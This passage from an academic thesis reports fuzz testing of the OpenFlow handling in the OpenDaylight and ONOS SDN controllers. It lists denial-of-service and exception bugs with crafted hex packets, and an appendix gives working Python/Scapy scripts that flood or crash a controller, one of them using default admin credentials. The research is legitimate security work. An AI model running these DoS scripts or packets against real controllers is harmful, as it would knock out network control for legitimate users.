model the OpenFlow protocol and conduct eﬃcient fuzz testing. The test suite
is written in Python and is composed of several scripts. Each script fuzzes a
packet type. There are 30 diﬀerent types of messages in OpenFlow version
1.3.4. The majority are controller command messages. The remaining are sent
from the switch to the controller and include types such as hello, error, echo
reply, experimenter, features reply, get conﬁg reply, packet in, ﬂow removed,
port status, multipart reply, barrier reply, queue get conﬁg reply, role reply,
get async reply.

We use the terms correct or legal when a packet follows OpenFlow speciﬁcation
and the terms illegal, manipulated or crafted when the packet is especially
modiﬁed during fuzz testing. Each protocol ﬁeld is fuzzed separately while
maintaining constant the other ﬁelds of the packet. Therefore, if we manipulate
the datapath ID ﬁeld of the Features Reply message, the remaining ﬁelds of
the same packet and the packets up to that point of communication follow the
standard.

OpenFlow protocol ﬁelds can be integers, strings, lists, bitmasks or other types.
Integers are the most common ﬁelds and their size can be 1, 2, 4 or 8 bytes.
Independently of the size, the payloads to fuzz integer ﬁelds are the following:
legal values; boundary values; minimum and maximum values for signed and
unsigned integers; random values. For simplicity, we show what these values
mean for the 1 byte version ﬁeld in the Hello message. The legal values
according to the speciﬁcation are 1, 2, 3 and 4, which stand respectively for
OpenFlow 1.0 to OpenFlow 1.3. The boundary values, 0 and 5, are the closest
integers to the legal values. In addition, the payloads include hexadecimal
values 0x00, 0x7f, 0x80 and 0xﬀ, which are the minimum and maximum values
for signed and unsigned integers. Obviously, the value 0 is not tested twice.
At last, the payloads include a random integer generated using Radamsa. For
longer ﬁelds such as the 2-byte length ﬁeld, the minimum and maximum values
for signed and unsigned integers are 0x0000, 0x7ﬀf, 0x8000 and 0xﬀﬀ. Payloads
to fuzz padding ﬁelds are built in the same way as with the integer ﬁelds.

A particular subset of ﬁelds is expressed as bitmasks, or a combination of
several ﬂags. Each correct bitmask value is converted into an integer and the
manipulated packets are constructed in a similar manner as with integer ﬁelds.
Sometimes, the set of correct values is large, as in the port features ﬁelds in the
port status packet. In this case, testing all the possible combinations equals to
bruteforcing. Instead, the payloads contain a larger number of random integers.

Variable-length data and string ﬁelds follow a rather diﬀerent approach. Such
ﬁelds include the data ﬁeld in error messages and manufacturer description in
multipart description reply messages. Crafted packets are derived from three
diﬀerent sources. The ﬁrst source is a huge list of random string generated
using Radamsa, as stated above. ASCII characters in the list are equally
distributed. This guarantees that the software withstands alpha-numeric,
printing, non-printing and special characters.

37

The second source is a list of strings that come from the communication of
Mininet switches with controllers, but are mutated using Radamsa. The last
source is the list of fuzzing strings used by Spike. The goal is to test the
controller for vulnerabilities such as XSS, SQL injection, command injection,
buﬀer overﬂows, path traversals or format string attacks. Finally, we add
manually several random strings that end or not with a null terminator.

The previous methods to construct payloads are combined to fuzz ﬁelds that
are arrays or lists. For simplicity, let’s assume the ﬁeld is a list of strings. The
same payload used for the string is repeated 0, 1, 2 and 256 times to form the
list. There is no particular reason for using the values 2 and 256. The goal is
to test lists containing a low and a high number of elements.

38

6 Results

In section 5, we discussed how various attacks are implemented and executed. Several
test cases failed and exposed critical and non critical vulnerabilities. In this section,
we deﬁne oracles, which determine if a test case was a failure or not, and report the
found vulnerabilities.

6.1 Fuzzing Oracles

Understanding test case failures becomes crucial for the success of security testing
process. Software come in diﬀerent size and shapes which makes hard to reveal
abnormal situations or illegal states in normal operation. While for an Image Viewer
software, a bug can be related to incorrect displaying of a picture, in case of a server,
slowing rate of processed packets might indicate a failure. Therefore, it is the task of
the security tester to determine failures and the instruments to detect them. Such
instruments are called Oracles [47]. Typically, fuzz testing causes the following
failures:

• Crashes: Such vulnerabilities might be very dangerous and result in denial of

service for legitimate users.

• Endless loops and deadlocks: Our testing targets, OpenDaylight and ONOS,
are multithreaded Java programs. Failure of the service might imply endless
loops or deadlocks waiting for resources to be available.

• Resource leaks: This kind of failure refers to the cases when the software does
not release an acquired resource. The outcome is excessive resource usage.

• Unexpected behaviour: Every other situation when the software does not behave

as its documentation falls under unexpected behavior.

The next important concept is to deﬁne possible Oracles [47]. The simplest
method to detect if a test case has succeeded is to implement a heartbeat or a
process that periodically tries to reconnect to the server and detect liveness. Fuzzing
requires sending thousands of packets and not always the target shows abnormalities.
After each test case, the heartbeat connects to the server and logs any unsuccessful
attempts.

An alternative to the ﬁrst oracle is to check the server’s response after sending a
fuzzed string. Eventually, the server can continue or interrupt the connection with
the fuzzer or send an incorrect response. Even though both the mentioned oracles
can beneﬁt from automation, it is important that the security tester observes the
results carefully. Human beings can draw conclusions about unspeciﬁed software
behavior much better than machines.

Another useful oracle is resource monitoring. This process aims at detecting
resource leaks failures, for example increased CPU, memory or disk usage. We
develop a simple script in Python that monitors CPU, memory consumption, disk
usage, and the number of connections and threads of the SDN controllers processes.

39

A white paper by Codenomicon [47] proposes to monitor such values using SNMP
whenever this protocol is available.

6.2 Discovered Vulnerabilities

In this section, we analyze the found vulnerabilities and related consequences. For
instance, vulnerability assessment includes CPU usage before and during denial of
service attacks.

The found vulnerabilities come as a result of test design and implementation in
sections 4 and 5, but there is no one-to-one correspondence between the following
list and the set of the test cases deﬁned in section 5. Many test cases failed to reveal
ﬂaws, while other bugs were identiﬁed accidentally during the testing process.

We show the found vulnerabilities following the Bugzilla writing guidelines and
format [48]. Some of the vulnerabilities have already been reported to their respective
mailing lists, while the others will be reported later.

Vulnerability 1: Denial of Service in OpenDaylight

• Summary: Denial of Service attack when the switch rejects to receive packets

from the controller.

• Component: This vulnerability aﬀects OpenDaylight odl-l2switch-switch,

which is the feature responsible for the OpenFlow communication.

• Version: OpenDaylight versions 3.3 and 4.0 are aﬀected from this ﬂaw. Java

version is openjdk version 1.8.0_91.

• Severity: OpenDaylight security advisories[39] classiﬁes denial of service

vulnerabilities of Important severity

• Priority:

It is easy and fast to exploit this vulnerability and cause the controller
to crash. Therefore, we strongly recommend to give high priority to ﬁx this
ﬂaw.

• Hardware: The testing environment included VirtualBox 5.0.20.

• OS: Testing was conducted in Ubuntu 15.10 64 bit.

• Description: To better understand this vulnerability, we refer to the exploit in
appendix A, Vulnerability 1. The code is written in Python using Scapy libraries.
The exploit connects to the OpenDaylight controller running in localhost, port
6653, and sends 100 000 OpenFlow hello packets. Afterwards, the sender closes
the stream. The controller tries to send a hello packet for each connection,
but the malicious script does not receive any data because stream.recv() is
missing. The thread that manages the connection with the exploit does not
terminate immediately after the stream is closed. As a result, the number
of threads of the controller process grows exponentially until it reaches the
maximum number of threads allowed in the running machine (around 32000

40

threads in our case). Subsequently, the controller crashes. Figure 11 shows the
number of threads during an interval of 30 seconds. The attack is launched
after three seconds and the server crashes after ten seconds. In this scenario,
the Java permanent generation size is assigned to the default value of 64MB.
This space is used to store strings and other metadata required by the Java
virtual machine. The controller does not crash if we expand this memory size
to 256MB using the following command:

e x p o r t JVM_ARGS="−Xmx1024m −XX: MaxPermSize=256m"

Figure 11: Number of threads during a DOS attack that causes the ODL controller
to crash

In the second scenario, the number of threads during time is shown in Figure
12. The attack is launched after ﬁve seconds and terminated after ten seconds.
In less than one minute, the controller returns to normal operation.

Vulnerability 2: Denial of Service in adding ﬂows in Open-

Daylight

• Summary: Controller throws an exception and does not allow user to add

subsequent ﬂow for a particular switch.

• Component: OpenDaylight odl-restconf feature contains this ﬂaw.

• Version: OpenDaylight 4.0 is aﬀected from this ﬂaw.

41

Figure 12: Number of threads during a DOS attack. ODL controller does not crash.

• Severity: According to OpenDaylight Security Advisories[39], this vulnerability
sits between Important and Moderate rank categories. We consider this ﬂaw
of an Important risk because the legitimate user is unable to add ﬂows until
the controller is restarted.

• Priority:

It is easy and fast to exploit this vulnerability and cause the controller
to throw an exception and reject ﬂows. Therefore, we strongly recommend to
give high priority to ﬁx this ﬂaw.

• Hardware: The testing environment included VirtualBox 5.0.20.

• OS: Testing was conducted in Ubuntu 15.10 64 bit.

• Description: This vulnerability was discovered fuzzing ﬂow removed messages.
Even though testing northbound API (i.e. REST API) is outside the scope of
this thesis, the denial of service attack is included due to the high importance
and severity it presents. The exploit is included in appendix A, Vulnerability
2. The script sends several equal REST API requests to add the same ﬂow
shown in the addFlow function. The ﬁrst requests are successful and the
controller returns the transaction ID. After a certain number of successful
requests, the controller returns the stack trace of a NullPointerException in
the HTTP response. Afterwards, the user is not able to add ﬂows to the same
switch, unless the controller is restarted. Figure 13 displays the number of
successful REST API requests until the controller throws the ﬁrst exception for

42

eleven diﬀerent switches. Later on, we rerun the exploit for the eleven switches
without restarting the controller as shown in Figure 14. For example, for the
ﬁrst switch of the Figure 13, the controller successfully returns the transaction
ID to the ﬁrst 25 requests and throws a NullPointerException for the remaining
REST API calls. Obviously, only the ﬁrst 120 requests are successful in the
case of the fourth switch, while the ninth switch throws the ﬁrst exception
after 450 requests. We rerun the exploit without restarting the controller and
all the switches throw exceptions for all the requests as indicated in Figure 14.
CPU consumption in Figure 15 clearly indicates an abnormal use of resources.

Figure 13: The number of successful requests before receiving the ﬁrst error.

Vulnerability 3: Denial of Service in OpenDaylight odl-

mdsal-xsql

• Summary:

Java out of memory error and signiﬁcant increase in resource

consumption.

• Component: OpenDaylight odl-mdsal-xsql is vulnerable to this ﬂaw.

• Version: The tested versions are OpenDaylight 3.3 and 4.0.

• Severity: Even though previous Denial of Service vulnerabilities have been
classiﬁed as Important, we rank this vulnerability as Moderate because the
feature odl-mdsal-xsql is not installed by default in the system and it is not
crucial for correct functioning of OpenFlow protocol.

43

Figure 14: Number of successful requests when the exploit is run for the second time
after it caused the error during the ﬁrst time.

• Priority:

It is easy and fast to exploit this vulnerability and cause the controller
to consume a signiﬁcant amount of CPU. Therefore, we strongly recommend
to give high priority to ﬁx this ﬂaw.

• Hardware: The testing environment included VirtualBox 5.0.20.

• OS: Testing was conducted in Ubuntu 15.10 64 bit.

• Description: Odl-mdsal-xsql component exposes two ports for users to query
or update database tables using XSQL, an XML-based query language. The
component is vulnerable to several denial of service attacks. These vulnerabili-
ties were originally found while scanning the target using nmap, the security
scanner, instead of threat modeling. Further investigation revealed the weak-
nesses and, because of the importance, we included them in this work. In
appendix A, Vulnerability 3, we show two exploits that consist in short fuzzing
string composed of several characters sent multiple times to ports 40004 and
34343. CPU consumption is shown in Figure 16. The attack starts after the
tenth second.

Vulnerability 4: StreamCorruptedException and NullPoint-

erException in OpenDaylight odl-mdsal-xsql

• Summary: Controller launches exceptions in the console.

44

Figure 15: CPU usage during Flow Dos attack

• Component: OpenDaylight odl-mdsal-xsql is vulnerable to this ﬂaw.

• Version: The tested versions are OpenDaylight 3.3 and 4.0.

• Severity: The exceptions cause low damage to the normal operation of the

controller.

• Priority: Due to low severity, we suggest low priority to ﬁx this ﬂaw.

• Hardware: The testing environment included VirtualBox 5.0.20.

• OS: Testing was conducted in Ubuntu 15.10 64 bit.

• Description: Running the exploit in appendix A, Vulnerability 4, causes the
controller to launch StreamCorruptedException and NullPointerException in
the console.

Vulnerability 5: DOMRpcImplementationNotAvailableEx-

ception when sending Port-Status packets to OpenDaylight

• Summary: Controller launches exceptions and consumes more CPU resources.

• Component: OpenDaylight is vulnerable to this ﬂaw.

• Version: The tested versions are OpenDaylight 3.3 and 4.0.

45

Figure 16: CPU usage during XSQL DOS attack

• Severity: The exceptions cause moderate damage to the normal operation of

the controller.

• Priority: Due to moderate severity, we suggest medium priority to ﬁx this

ﬂaw.

• Hardware: The testing environment included VirtualBox 5.0.20.

• OS: Testing was conducted in Ubuntu 15.10 64 bit.

• Description: Sending the following Port-Status packet 040c005000000015020000
00000000000000000000000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000
causes the controller to launch several DOMRpcImplementationNotAvailable
Exception-s and consume more resources. Number of created threads doubles
and CPU consumption increases but not at the same levels as when exploiting
vulnerabilities 2 and 3. Thus, the latest are assigned a higher severity.

Other bugs that do not have a clear security impact

The bugs shown below do not pose a security risk but clearly indicate bad imple-
mentation practices. Exploiting such bugs throw exceptions, which are logged either
in the controller console or in the logs. For simplicity, we include only the malicious
packets encoded as hexadecimal strings. The communication up to the crafted packet

46

has continued as speciﬁed in the OpenFlow speciﬁcation [8]. For example, the packet
0406002000000002ﬀﬀﬀﬀﬀﬀﬀﬀ00000100fe0000000000004700000000 is an example of a
crafted Features Reply packet with datapath ID equal to ﬀﬀﬀﬀﬀﬀﬀﬀ. The feature
request-reply pair of messages is exchanged after the controller has agreed with
the switch about the OpenFlow version using Hello packets. In order to send the
malicious Features Reply packet, the exploit needs to send a correct Hello packet to
the controller. We omit this part of the communication and assume it follows the
OpenFlow speciﬁcation.

1.

• Target: OpenDaylight 3.3, 4.0

• Packet: Manipulated Hello packet where the header type is changed to 1

as in 0401000800000001.

• Description:

If the switch sends the previous payload instead of the Hello
packet, the controller interprets the received message as an Error packet
because of the header type equal to 1. The controller expects the Error
packet to be longer than 8 bytes and launches an IndexOutOfBoundsEx-
ception. The same outcome is achieved if the header type is for example,
equal to 4.

2.

• Target: OpenDaylight 3.3, 4.0

• Packet: Manipulated Hello packet with header type equal to 7f as in

047f000800000001.

• Description:

If the switch sends the previous payload instead of the Hello
packet; the controller fails to parse it and registers a NullPointerException
in the log ﬁle.

3.

• Target: OpenDaylight 4.0

• Packet: Manipulated Hello packet with header transaction id equal to

ﬀﬀﬀﬀ as in 04000008ﬀﬀﬀﬀ.

• Description: The controller accepts header transaction ids up to ﬀﬀﬀfe
and throws an IllegalArgumentException if the transaction id is equal to
ﬀﬀﬀﬀ.

4.

• Target: OpenDaylight 3.3, 4.0

• Packet: Modiﬁed Experimenter packet with experimenter type equal to

0 as in 04040010000000150000000000000000

• Description: When an experimenter type has not been deﬁned, the
controller registers an IllegalStateException in the log ﬁle. This packet
is sent after the controller and the malicious switch have successfully
exchanged correct Hello Packets.

5.

• Target: OpenDaylight 3.3, 4.0

• Packet: Manipulated Feature Reply packet as in 04060020000000160000000

00000ﬀ0000000100fe0000000000004700000000

47

• Description:

If the packet is sent twice, there will be two open connections
with the same datapath id. The controller will try to transfer the ownership
of the switch identiﬁed by the datapath id from the ﬁrst to the second
connection, which terminates immediately after sending the packet. As a
result, the controller registers a NullPointerException in the log ﬁle.

6.

• Target: OpenDaylight 3.3, 4.0

• Packet: Manipulated Port Status packet as in 040c005000000015cf0000000
000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000
000000000

• Description:

If the packet is sent twice, there will be two open connections
with the same datapath id. The controller will try to transfer the ownership
of the switch identiﬁed by the datapath id from the ﬁrst to the second
connection, which terminates immediately after sending the packet. As a
result, the controller registers a NullPointerException in the log ﬁle.

7.

• Target: ONOS 1.5

• Packet: Manipulated Hello packet with OpenFlow version equal to 7f as

in 7f00000800000001

• Description: The controller throws an IllegalArgumentException when
OpenFlow protocol version is not supported such as in the previous packet
where the Hello packet version is equal to 7f.

8.

• Target: ONOS 1.5

• Packet: Manipulated Hello packet with header type equal to 4 as in

0404000800000001.

• Description: The controller throws an OFParseError when the expected
packet length diﬀers from the received one. In the previous packet, the
length is 8 bytes instead of 16, which the length of Experimenter packets.
The controller interprets the manipulated Hello packet as an Experimenter
packet because the header type is equal to 4.

9.

• Target: ONOS 1.5

• Packet: Manipulated Experimenter packet with experimenter type equal

to 0 as in 04040010000000150000000000000000.

• Description: The controller throws an OFParseError when does not
recognize experimenter type, which is equal to 0 in the previous packet.

The results are summarized in table 7.

48

Target

Packet

Description

ODL 3.3, 4.0
ODL 3.3, 4.0
ODL 3.3, 4.0

ODL 3.3, 4.0

ODL 3.3, 4.0

ODL 3.3, 4.0

ONOS 1.5

0401000800000001
047f000800000001
04000008ﬀﬀﬀﬀ
0404001000000015
0000000000000000
0406002000000016
000000000000ﬀ00
00000100fe00000000
00004700000000
040c005000000015cf0000000000000
00000000000000000000000000000000
0000000000000000000000000000000000
0000000000000000000000000000000000
00000000000000000000000000000
7f00000800000001

ONOS 1.5

0404000800000001

ONOS 1.5

0404001000000015
0000000000000000

IndexOutOfBoundsException
NullPointerException
IllegalArgumentException

IllegalStateException

NullPointerException

NullPointerException

IllegalArgumentException

OFParseError

OFParseError

Table 7: Summary of found bugs

49

7 Discussion

This section summarizes the found vulnerabilities and discusses the testing eﬃciency.
Test coverage is another topic covered in the next paragraphs. At last, we provide
suggestions how to increase test coverage.

7.1 Summary Of The Discovered Vulnerabilities

In the previous chapters, we described ﬁve denial of service attacks initiated from
malicious or compromised switches to OpenDaylight SDN controller. Moreover,
fuzz testing contributed in discovering several implementation bugs that leaded to
registered exceptions in the log ﬁle. Increased resource consumption such as CPU or
number of threads, revealed to be the most common consequence during vulnerability
exploitation.

The most dangerous vulnerability causes the OpenDaylight controller to create
a large number of threads in a few seconds. The controller crashes due to lack of
memory in the system. The denial of service attack occurs when the switch denies
to receive any packet from the controller, for example, through omitting the recv()
function in Python. The vulnerability has been reported to the OpenDaylight security
team.

Three more vulnerabilities aﬀect the odl-mdsal-xsql component. This component
is not installed by default and is not a mandatory requirement for correct functioning
of the SDN networks. Therefore, exploiting such vulnerabilities presents a higher
diﬃculty. Two of these ﬂaws have a signiﬁcant impact in CPU consumption. As
observed during the attack, CPU usage increased up to 350% in a quad core processor.
An additional denial of service forbids honest SDN applications to add ﬂows to
the switches by calling northbound REST API requests. The DOS eﬀect lasts until
the OpenDaylight controller is restarted. As a side eﬀect, CPU consumption explodes
during vulnerability exploitation. This vulnerability was discovered accidentally
while fuzzing the southbound API, rather than by fuzzing. This fact emphasizes the
need and importance of human interaction with security testing. Automatic testing
does not allow the same ﬂexibility as the manual veriﬁcation of ﬂaws. An automatic
test case can ﬁnd only the vulnerabilities it is programmed for, while a careful human
eye can easily observe an incorrect behavior.

Moreover, by examining the log ﬁles, we discovered that several illegal packets
from the switch caused exceptions such as Null Pointer, Index Out Of bounds or
Illegal Argument. These bugs aﬀected both OpenDaylight and ONOS controllers
but had no signiﬁcant impact from a security viewpoint. The low number of found
vulnerabilities implies that good quality control had been done on the test targets,
especially regarding the OpenFlow communication modules. The odl-mdsal-xsql
module in the OpenDaylight controller should be improved further more because
this module is aﬀected by three DOS vulnerabilities.

Introducing TLS in the controller-switch communication increases the overall
security of the SDN networks because TLS guarantees the integrity property. However,
TLS does not present any diﬃculties exploiting the found vulnerabilities when the

50

switches are not authenticated. TLS can be used to verify the identity of the server
(i.e. the SDN controller), of the client (i.e. the SDN switch), or of both. Typically,
only the controller is authenticated. In this scenario, the controller is not able to
distinguish connections coming from malicious switches. Therefore, the attacker can
exploit all the found vulnerabilities in this thesis. In contrast, when the switches
are authenticated, the attacker needs to compromise a legitimate switch and inject
crafted packets in the network.
In this case, the network administrator should
increase the physical security of the switches and patch any vulnerabilities that can
allow the attacker to extract the TLS certiﬁcate or authentication key.

7.2 Test Coverage

Given time and cost constraints, it is impossible to implement exhaustive test cases.
Therefore, the main goal is to design the subset of test cases that have the highest
probability to detect errors. One methodology is to select a data set that increases
the proportion of source code tested by a particular test suite. Test coverage is the
metric to measure such proportion. High test coverage implies that there is a lower
probability that a piece of code contains undetected vulnerabilities.

Authors in [49] discuss several coverage categories such as statement, decision,
condition, decision/condition or multiple-condition coverage. All these categories
fall under white-box testing. As described in section 3.2, the security tester has
full access to the source code during white-box testing. Even though both the
controllers OpenDaylight and ONOS are open source, the strategy followed in this
work, is purely black-box. A noteworthy advantage for such solution is that the
test suite can be executed against diﬀerent controllers that support OpenFlow, thus
guaranteeing portability. A second motivation for selecting black-box strategy is
that the source code is complex and composed of multiple modules. The OpenFlow
communication makes up a small proportion of such modules. Conducting white-box
testing would require identifying and separating code responsible for the controller-
switch communication. This results a diﬃcult task considering the software size and
complexity. Moreover, we would achieve inaccurate test coverage percentage using
traditional Java code coverage tools on the entire software. The reason is that we
are testing a small component of the software.

We conducted black-box testing based on the OpenFlow speciﬁcation 1.3.4 [8].
This version deﬁnes 30 diﬀerent types of packets, where the majority ﬂows from the
controller to the switch. Therefore, this set is excluded from fuzzing because we fuzz
the packets going on the opposite direction from the switch to the controller. It poses
a challenge to measure test coverage based on manipulating such packets. Whalen et
al. [50] analyze several objective and implementation-independent coverage metrics
that measure how well a black-box test suite exercises a set of requirements.

Modiﬁed Condition/Decision Coverage (MC/DC) is one of the black-box coverage
metrics. Decisions are represented as boolean expressions, for example (A ∧ B). The
positive test cases are the ones where the outcome of the boolean expressions is true.
On the other side, the negative set is the set of test cases where the decision outcome
is false. If we consider these statements in the OpenFlow world, ﬁelds in a packet are

51

connected using logical AND operators to form a packet. The expression outcome is
true if the packet follows the OpenFlow speciﬁcation. That means that all the ﬁelds
should contain values that are allowed by the speciﬁcation. Obviously, the outcome
is false if at least one of the ﬁelds does not follow the speciﬁcation. Our test suite
comprises test cases from both positive and negative sets. In other words, for each
packet type, we deﬁne at least one test case where every ﬁeld value in the packet is
legal according to the speciﬁcation. In addition, for each ﬁeld of each packet type,
we deﬁne at least one test case where the ﬁeld value is illegal while all the other ﬁeld
values in the same packet are correct according to the speciﬁcation. In this sense,
we have correctly identiﬁed all the positive and negative sets and implemented at
least one test case from each set. Obviously, the size of the negative set is larger
than the size of the positive one because the number of illegal packets is higher than
the number of correct ones. Although we have reached a high MC/DC coverage, the
choice of test cases from the negative sets poses a challenge. An illegal value might
crash the target while another value might fail to identify the ﬂaw, even when both
the values belong to the same negative set.

An alternative way to increase test coverage is to follow a state-based approach
for testing. Even though the malicious switch sends the same input to the controller,
the latter might be in a diﬀerent state. For example, the switch notiﬁes the controller
using a port status message, that the port number 2 has been removed. The switch
might have declared before such port as existing or not. The controller will probably
be in two diﬀerent states upon receiving the port status message, depending on
whether the port number 2 existed previously or not. There is a high probability
that code coverage increases, even though we cannot claim this is certain without
analyzing the source code.

Due to time constraints and considering the complexity of OpenFlow protocol, it
was not possible to implement a full state diagram. Increasing the number of test
case scenarios, that cover a higher number of states, could help covering larger parts
of the software.

52

8 Conclusion

Software-deﬁned networking is a new paradigm that separates the network’s control
plane from the data plane. Many SDN controllers have been implemented since
this concept was ﬁrst introduced. As with other network models, security becomes
an important requirement because adversaries can launch various attacks to steal
sensitive data, manipulate network’s state or cause denial of service to legitimate users.
In this work, we apply fuzzing techniques to discover vulnerabilities in implementation
of the OpenFlow protocol in SDN controllers such as OpenDaylight and ONOS.

We ﬁrst introduced the main concepts related to this work starting with a short
overview of SDN and OpenFlow. Afterwards, we described the main techniques and
tools how to conduct fuzz testing or manipulate regular packets to cause unexpected
behavior. Careful planning and understanding of the system is crucial to improve
testing eﬃciency. Threat modeling is an approach to identify and analyze risks and
threats in the system under test. The list of threats is ﬁrst constructed applying the
STRIDE methodology and extended using CAPEC Mitre attack libraries.

The next step is to rank threats according to the OpenDaylight and ONOS
security advisories. The goal is to put more eﬀort in testing the most probable and
most dangerous threats. Denial of service attacks are the easiest and most dangerous
to exploit.

In order to implement testing, controllers and fuzzers run in virtual machines.
Several diﬀerent fuzzing methodologies were employed that involved four fuzzers
such as Radamsa, ProxyFuzz, Scapy and Spike. While Radamsa and ProxyFuzz
randomly mutated valid input coming from Mininet switches, Spike and Scapy were
used to model the OpenFlow protocol. Due to ease of use and good documentation,
Scapy revealed to be the fundamental tool to conduct fuzzing. The goal is to fuzz
the packets that the switch sends to the controllers. In order to achieve this goal,
we model each packet and fuzz each ﬁeld separately one at a time, maintaining
constant the other ﬁelds of the same packet and the other packets during the same
communication. Depending on the ﬁeld type, testing involves operators such as bit
ﬂipping, byte swapping or appending random large quantities of data. Testing denial
of service attacks takes the largest share of eﬀort.

Testing revealed a considerable number of denial of service vulnerabilities and
other bugs. An exploit of few lines of code written using Scapy, managed to crash
the controller. The number of threats created in OpenDaylight increased up to
the maximum value allowed in the system and afterwards, the controller crashed.
Increasing Java heap memory size avoids complete denial of service, even though the
number of threads explodes after a few seconds.

Another important denial of service attack blocked legitimate applications to add
ﬂows to particular switches until the OpenDaylight controller is restarted. Other
vulnerabilities aﬀected the odl-mdsal-xsql component in OpenDaylight. As a con-
sequence, the controller launched several exceptions such as Java out of memory
or NullPointerException. A DOMRpcImplementationNotAvailableException was
observed when sending particular a port-status packet to OpenDaylight. As a side
eﬀect, CPU consumption increased signiﬁcantly in all the previously mentioned vul-

nerabilities. Moreover, fuzzing revealed several less important bugs, which aﬀected
both OpenDaylight and ONOS controllers.

Testing presented a number of challenges. Measuring and improving test coverage
poses a signiﬁcant issue. Increasing the number of test case scenarios or implementing
additional fuzzing techniques could help covering larger parts of the software.

53

Appendix A

Appendix A contains exploits, written in Python, for the discovered vulnerabilities.

Vulnerability 1: Denial of Service in OpenDaylight 3.3 and 4.0.

54

from scapy . a l l

import ∗

IP_ADDRESS = " 1 2 7 . 0 . 0 . 1 "
PORT = 6653

d e f

sendPacket ( ) :

s o c k = s o c k e t . s o c k e t ( )
s o c k . c o n n e c t ( (IP_ADDRESS, PORT) )
stream = StreamSocket ( s o c k )
stream . send ( " \ x04 \ x00 \ x00 \ x08 \ x00 \ x00 \ x00 \ x01 " )

stream . c l o s e ( )

i f __name__ == ’__main__ ’ :

f o r

i

i n r a n g e ( 0 , 1 0 0 0 0 0 ) :

sendPacket ( )

Vulnerability 2: Denial of Service in adding ﬂows in OpenDaylight 4.0

import
from time import

r e q u e s t s

s l e e p

o p e n f l o w i d = 23
h e l l o = " \ x04 \ x00 \ x00 \ x08 \ x00 \ x00 \ x00 \ x15 "
HEADER_SIZE = 8
IP_ADDRESS = " 1 2 7 . 0 . 0 . 1 "
PORT = 6653

d e f c o n n e c t ( ) :

s o c k = s o c k e t . s o c k e t ( )
s o c k . c o n n e c t ( (IP_ADDRESS, PORT) )
stream = StreamSocket ( s o c k )
r e t u r n stream

d e f

sendFeatReply ( stream ,

i n d e x ) :

l o a d _ c o n t r i b ( ’ openflow3 ’ )
p r e _ f e a t = " \ x04 \ x06 \ x00 \ x20 "
p o s t _ f e a t = " \ x00 \ x00 \ x01 \ x00 \ x f e \ x00 \ x00
\ x00 \ x00 \ x00 \ x00 \ x47 \ x00 \ x00 \ x00 \ x00 "
datapath_id = s t r u c t . pack ( ’ >Q’ ,

i n d e x )

55

FEAT_REQUEST = 5
e x i t = F a l s e
w h i l e ( e x i t == F a l s e ) :

h e a d e r = stream . r e c v (HEADER_SIZE)
t r y :

i f h e a d e r != 0 :

p a c k e t = Ether ( ) / IP ( ) /TCP( s p o r t =6653)/ h e a d e r
p a c k e t . g e t l a y e r (TCP) . decode_payload_as ( OFPTHello )
new_xid = p a c k e t [ OFPTHello ] . x i d
i f p a c k e t [ OFPTHello ] . l e n != HEADER_SIZE :

p a c k e t = p a c k e t / stream . r e c v (
p a c k e t [ OFPTHello ] . l e n − HEADER_SIZE)

i f p a c k e t [ OFPTHello ] . type == FEAT_REQUEST:
stream . send ( p r e _ f e a t + s t r u c t . pack ( ’ > I ’ , new_xid ) +
datapath_id + p o s t _ f e a t )
e x i t = True

e l s e :

e x i t = True

s o c k e t . e r r o r a s
" Timeout

" ,

s o c k e t e r r o r

s o c k e t e r r o r :

e x c e p t
p r i n t
e x i t = True
p a s s

d e f addFlow ( ) :

payload = "<?xml v e r s i o n = \ " 1 . 0 \ " e n c o d i n g =\"UTF−8\"

s t a n d a l o n e =\"no\"?> \
<i n p u t xmlns =\" urn : o p e n d a y l i g h t : f l o w : s e r v i c e \"> \
<b a r r i e r >f a l s e </ b a r r i e r > \
<node xmlns : i n v =\" urn : o p e n d a y l i g h t : i n v e n t o r y \">
/ i n v : nodes / i n v : node [ i n v : i d =\" o p e n f l o w : " + s t r ( o p e n f l o w i d )
+ "\"] </ node> \

<c o o k i e >43</ c o o k i e > \
<f l a g s >SEND_FLOW_REM</ f l a g s > \
<hard−timeout >0</hard−timeout> \
<i d l e −timeout >0</ i d l e −timeout> \
<i n s t a l l H w >f a l s e </i n s t a l l H w > \
<match> \
<e t h e r n e t −match> \
<e t h e r n e t −type> \
<type >2048</type> \
</e t h e r n e t −type> \
</e t h e r n e t −match> \
<ipv4−d e s t i n a t i o n >10.0.10.3/32 </ ipv4−d e s t i n a t i o n > \
</match> \
<i n s t r u c t i o n s > \
<i n s t r u c t i o n > \
<o r d e r >0</o r d e r > \
<apply−a c t i o n s > \

56

<a c t i o n > \
<output−a c t i o n > \
<output−node−c o n n e c t o r >1</output−node−c o n n e c t o r > \
</output−a c t i o n > \
<o r d e r >0</o r d e r > \
</a c t i o n > \
</apply−a c t i o n s > \
</ i n s t r u c t i o n > \
</ i n s t r u c t i o n s > \
<p r i o r i t y >0</ p r i o r i t y > \
< s t r i c t >f a l s e </ s t r i c t > \
<t a b l e _ i d >0</t a b l e _ i d > \
</input >"

h e a d e r s = { ’ A u t h o r i z a t i o n ’ :
’ Accept ’ :
’ a p p l i c a t i o n /xml ’ }

’ a p p l i c a t i o n /xml ’ ,

’ B a s i c YWRtaW46YWRtaW4= ’ ,
’ Content−Type ’ :

r = r e q u e s t s . p o s t ( " h t t p : / / l o c a l h o s t : 8 0 8 0 / r e s t c o n f /
o p e r a t i o n s / s a l −f l o w : add−f l o w " , data=payload , h e a d e r s=h e a d e r s )
p r i n t
r e t u r n True

r . t e x t

d e f

sendPacket ( ) :

l o a d _ c o n t r i b ( ’ openflow3 ’ )
f o r

i n r a n g e ( 0 , 1 0 0 0 ) :

i

i

p r i n t
stream = c o n n e c t ( )
stream . send ( h e l l o )
sendFeatReply ( stream , o p e n f l o w i d )
addFlow ( )
stream . c l o s e ( )

i f __name__ == ’__main__ ’ :
sendPacket ( )

Vulnerability 3: Denial of service in OpenDaylight odl-mdsal-xsql

from scapy . a l l

import ∗

IP_ADDRESS = " 1 2 7 . 0 . 0 . 1 "
PORT = 40004

i f __name__ == ’__main__ ’ :

f o r

i

i n r a n g e ( 0 , 1 0 0 0 ) :

s o c k = s o c k e t . s o c k e t ( )

57

s o c k . c o n n e c t ( (IP_ADDRESS, PORT) )
stream = StreamSocket ( s o c k )
payload = "!#%&"
stream . send ( payload )
stream . c l o s e ( )

from scapy . a l l

import ∗

